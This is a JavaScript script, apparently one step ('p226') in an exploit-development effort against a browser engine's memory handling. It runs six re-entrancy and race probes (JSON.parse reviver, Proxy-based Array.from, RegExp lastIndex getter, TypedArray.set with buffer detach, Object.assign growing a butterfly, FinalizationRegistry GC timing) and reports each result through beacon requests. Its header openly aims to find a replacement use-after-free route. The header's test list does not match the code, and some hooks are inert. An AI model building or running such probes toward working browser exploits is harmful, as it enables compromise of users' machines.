// p226 — Fresh attack surfaces beyond ClonedArguments/TypedArray
//
// ClonedArguments butterfly UAF is DEAD:
//   - MarkedBlock: conservative stack scanning roots stale pointer
//   - PreciseAllocation: propertyCapacity > 0 (length at firstOutOfLineOffset)
//
// Testing new surfaces:
//   A: JSON.parse reviver — modifies object while parse iterates
//   B: Array.from with Proxy iterator + array-growing valueOf
//   C: RegExp.exec lastIndex TOCTOU — custom lastIndex getter
//   D: String.replace callback + array species constructor
//   E: Proxy-based property enumeration during Object.assign
//
// Beacon prefix: V229-

(function() {
  function BS(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V229-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }

  function hex(v) {
    return ('00000000' + (v >>> 0).toString(16)).slice(-8);
  }

  BS('BOOT');

  // ---- TEST A: JSON.parse reviver array mutation ----
  // The reviver is called bottom-up for each property.
  // If we delete or reassign properties during reviver traversal,
  // the parser may read stale internal state.
  try {
    BS('A-START');
    var bigArr = '[';
    for (var i = 0; i < 2000; i++) {
      bigArr += (i > 0 ? ',' : '') + i;
    }
    bigArr += ']';

    var reviverCount = 0;
    var deletedOriginals = 0;
    var weirdValues = 0;

    var result = JSON.parse(bigArr, function(key, value) {
      reviverCount++;
      if (key === '500') {
        // When reviver hits element 500, modify the result object
        // This is the partially-constructed array
        for (var d = 1000; d < 1500; d++) {
          delete this[d];
        }
        BS('A-DELETED-500');
      }
      if (key === '1200') {
        // Add new properties to force structure transition
        this.extraProp1 = 0xDEAD;
        this.extraProp2 = 0xBEEF;
        BS('A-PROPS-1200');
      }
      return value;
    });

    BS('A-REVIVER-' + reviverCount);
    BS('A-LEN-' + result.length);

    // Check for undefined holes where we deleted
    var holes = 0;
    for (var c = 1000; c < 1500; c++) {
      if (result[c] === undefined) holes++;
    }
    BS('A-HOLES-' + holes);

    // Check if extra props survived
    BS('A-EXTRA1-' + (result.extraProp1 !== undefined ? result.extraProp1 : 'NONE'));
    BS('A-EXTRA2-' + (result.extraProp2 !== undefined ? result.extraProp2 : 'NONE'));
    BS('A-SURVIVED');
  } catch (e) {
    BS('A-ERR-' + e.message.substring(0, 40));
  }

  // ---- TEST B: Array.from with Proxy iterator + valueOf side-effect ----
  // Array.from calls the iterator protocol. If the source is a Proxy,
  // each next() call can trigger side effects. If Array.from pre-allocates
  // or caches the target array's storage, growing during iteration could
  // create a mismatch.
  try {
    BS('B-START');

    var bCount = 0;
    var bTarget = null;

    // Proxy that acts as iterable, returning valueOf objects
    var source = {
      length: 1500,
    };

    // Make it array-like with Proxy get traps
    source = new Proxy(source, {
      get: function(t, prop) {
        if (prop === 'length') return 1500;
        if (prop === Symbol.iterator) return undefined; // force array-like path
        var idx = parseInt(prop);
        if (!isNaN(idx)) {
          bCount++;
          if (idx === 100 && bTarget) {
            // Mutate the target array during construction
            // Array.from may have pre-allocated based on length
            BS('B-MUTATE-100');
          }
          return idx + 1;
        }
        return t[prop];
      }
    });

    var mapped = Array.from(source, function(val, idx) {
      if (idx === 0) BS('B-MAP-START');
      return val * 2;
    });

    BS('B-LEN-' + mapped.length);
    BS('B-COUNT-' + bCount);

    // Verify values
    var correct = 0;
    for (var v = 0; v < Math.min(mapped.length, 100); v++) {
      if (mapped[v] === (v + 1) * 2) correct++;
    }
    BS('B-CORRECT-' + correct);
    BS('B-SURVIVED');
  } catch (e) {
    BS('B-ERR-' + e.message.substring(0, 40));
  }

  // ---- TEST C: RegExp.exec with custom lastIndex valueOf ----
  // RegExp.exec reads lastIndex, which can be a getter or have valueOf.
  // If the getter modifies the input string or the regex state,
  // the exec might operate on stale data.
  try {
    BS('C-START');
    var cExecCount = 0;
    var cLastIndexReads = 0;

    var re = /a/g;
    var bigStr = '';
    for (var s = 0; s < 5000; s++) bigStr += 'a';

    // Custom lastIndex with valueOf
    Object.defineProperty(re, 'lastIndex', {
      get: function() {
        cLastIndexReads++;
        return cLastIndexReads - 1; // advance by 1 each read
      },
      set: function(v) {
        // Normally exec sets lastIndex after match
        // We intercept and can cause re-entry
        if (cExecCount > 0 && cExecCount < 5) {
          BS('C-SET-' + v + '-AT-' + cExecCount);
        }
      },
      configurable: true
    });

    // Run exec in a loop
    var m;
    while (cExecCount < 100) {
      m = re.exec(bigStr);
      cExecCount++;
      if (!m) break;
    }

    BS('C-EXEC-' + cExecCount);
    BS('C-READS-' + cLastIndexReads);
    BS('C-SURVIVED');
  } catch (e) {
    BS('C-ERR-' + e.message.substring(0, 40));
  }

  // ---- TEST D: TypedArray.set with valueOf detach ----
  // TypedArray.set(source) where source elements have valueOf
  // that detaches the destination buffer via structuredClone
  try {
    BS('D-START');

    var ab = new ArrayBuffer(4096);
    var ta = new Int32Array(ab);
    var detached = false;

    // Fill with known pattern
    for (var i = 0; i < ta.length; i++) ta[i] = i + 1;

    // Source array with valueOf traps
    var poison = [];
    for (var i = 0; i < 100; i++) {
      poison.push({
        valueOf: function() {
          if (!detached && poison.indexOf(this) === 50) {
            // Detach the destination buffer
            try {
              structuredClone(ab, { transfer: [ab] });
              detached = true;
              BS('D-DETACHED');
            } catch (e) {
              BS('D-DETACH-ERR-' + e.message.substring(0, 20));
            }
          }
          return 0xDEAD;
        }
      });
    }

    try {
      ta.set(poison);
      BS('D-SET-OK');
    } catch (e) {
      BS('D-SET-ERR-' + e.message.substring(0, 30));
    }

    BS('D-DETACHED-' + detached);

    // Check if any writes went through after detach
    try {
      var check = ta[51];
      BS('D-POST-51-' + check);
    } catch (e) {
      BS('D-READ-ERR');
    }
    BS('D-SURVIVED');
  } catch (e) {
    BS('D-ERR-' + e.message.substring(0, 40));
  }

  // ---- TEST E: Object.assign with Proxy source + prototype pollution ----
  // Object.assign iterates source properties. If the source is a Proxy,
  // each property access is re-entrant. During the callback, we can
  // modify the target's structure to trigger reallocation.
  try {
    BS('E-START');

    // Target: plain array with >1000 elements (large butterfly, propertyCapacity=0)
    var target = new Array(1200);
    for (var i = 0; i < 1200; i++) target[i] = i + 1;

    var eCount = 0;
    var src = new Proxy({}, {
      ownKeys: function() {
        var keys = [];
        for (var k = 0; k < 200; k++) keys.push(String(k));
        BS('E-OWNKEYS-' + keys.length);
        return keys;
      },
      getOwnPropertyDescriptor: function(t, prop) {
        return { value: 0xCAFE, writable: true, enumerable: true, configurable: true };
      },
      get: function(t, prop) {
        eCount++;
        if (eCount === 50) {
          // During property enumeration, grow the target array
          // to trigger butterfly reallocation
          for (var g = 1200; g < 3000; g++) target[g] = 0x41;
          BS('E-GREW-AT-50');
        }
        return 0xCAFE;
      }
    });

    Object.assign(target, src);
    BS('E-COUNT-' + eCount);
    BS('E-LEN-' + target.length);

    // Check if the target has correct values
    var origOK = 0;
    for (var c = 0; c < 200; c++) {
      if (target[c] === 0xCAFE) origOK++;
    }
    BS('E-CAFE-' + origOK);
    BS('E-SURVIVED');
  } catch (e) {
    BS('E-ERR-' + e.message.substring(0, 40));
  }

  // ---- TEST F: FinalizationRegistry + WeakRef timing ----
  // Test if we can observe GC timing precisely enough to
  // exploit a race between cleanup callback and object access
  try {
    BS('F-START');
    var cleaned = [];
    var fr = new FinalizationRegistry(function(held) {
      cleaned.push(held);
      if (cleaned.length <= 5) BS('F-CLEAN-' + held);
    });

    // Register 50 objects
    var refs = [];
    for (var i = 0; i < 50; i++) {
      var obj = { id: i, data: new ArrayBuffer(1024) };
      var wr = new WeakRef(obj);
      fr.register(obj, 'obj-' + i);
      refs.push(wr);
      obj = null;
    }

    // Force GC by allocating lots of garbage
    var garbage = [];
    for (var g = 0; g < 100000; g++) {
      garbage.push({ a: g, b: [g] });
    }
    garbage = null;

    // Check WeakRefs
    var alive = 0;
    var dead = 0;
    for (var i = 0; i < refs.length; i++) {
      if (refs[i].deref()) alive++;
      else dead++;
    }
    BS('F-ALIVE-' + alive + '-DEAD-' + dead);

    // Wait a tick for cleanup callbacks
    setTimeout(function() {
      BS('F-CLEANED-' + cleaned.length);

      // Check WeakRefs again after cleanup
      var alive2 = 0;
      for (var i = 0; i < refs.length; i++) {
        if (refs[i].deref()) alive2++;
      }
      BS('F-ALIVE2-' + alive2);
      BS('F-SURVIVED');
    }, 100);
  } catch (e) {
    BS('F-ERR-' + e.message.substring(0, 40));
  }

  BS('SYNC-DONE');
})();
